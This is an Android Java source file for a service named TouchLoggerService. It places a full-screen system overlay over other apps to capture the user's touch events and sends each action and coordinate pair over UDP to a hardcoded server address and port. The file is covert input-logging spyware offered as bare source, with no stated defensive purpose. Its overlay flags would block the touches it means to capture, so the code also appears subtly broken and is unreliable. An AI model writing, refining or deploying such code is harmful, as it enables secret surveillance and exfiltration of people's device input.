import android.app.Service;
import android.content.Intent;
import android.os.IBinder;
import android.view.MotionEvent;
import android.view.View;
import android.view.WindowManager;
import java.io.IOException;
import java.net.DatagramPacket;
import java.net.DatagramSocket;
import java.net.InetAddress;

public class TouchLoggerService extends Service {
    private DatagramSocket socket;
    private InetAddress serverAddress;
    private int serverPort = 12345;
    private String serverIp = "192.168.1.100";

    @Override
    public void onCreate() {
        super.onCreate();
        try {
            socket = new DatagramSocket();
            serverAddress = InetAddress.getByName(serverIp);
            WindowManager windowManager = (WindowManager) getSystemService(WINDOW_SERVICE);
            View overlayView = new View(this) {
                @Override
                public boolean onTouchEvent(MotionEvent event) {
                    sendTouchEvent(event);
                    return super.onTouchEvent(event);
                }
            };
            WindowManager.LayoutParams params = new WindowManager.LayoutParams(
                    WindowManager.LayoutParams.MATCH_PARENT,
                    WindowManager.LayoutParams.MATCH_PARENT,
                    WindowManager.LayoutParams.TYPE_SYSTEM_OVERLAY,
                    WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE |
                    WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE,
                    android.graphics.PixelFormat.TRANSLUCENT);
            windowManager.addView(overlayView, params);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    private void sendTouchEvent(MotionEvent event) {
        new Thread(() -> {
            try {
                String touchData = String.format("Touch: %s, X: %f, Y: %f",
                        event.getAction() == MotionEvent.ACTION_DOWN ? "DOWN" :
                        event.getAction() == MotionEvent.ACTION_UP ? "UP" : "MOVE",
                        event.getX(), event.getY());
                byte[] buffer = touchData.getBytes();
                DatagramPacket packet = new DatagramPacket(buffer, buffer.length, serverAddress, serverPort);
                socket.send(packet);
            } catch (IOException e) {
                e.printStackTrace();
            }
        }).start();
    }

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        if (socket != null) {
            socket.close();
        }
    }
}
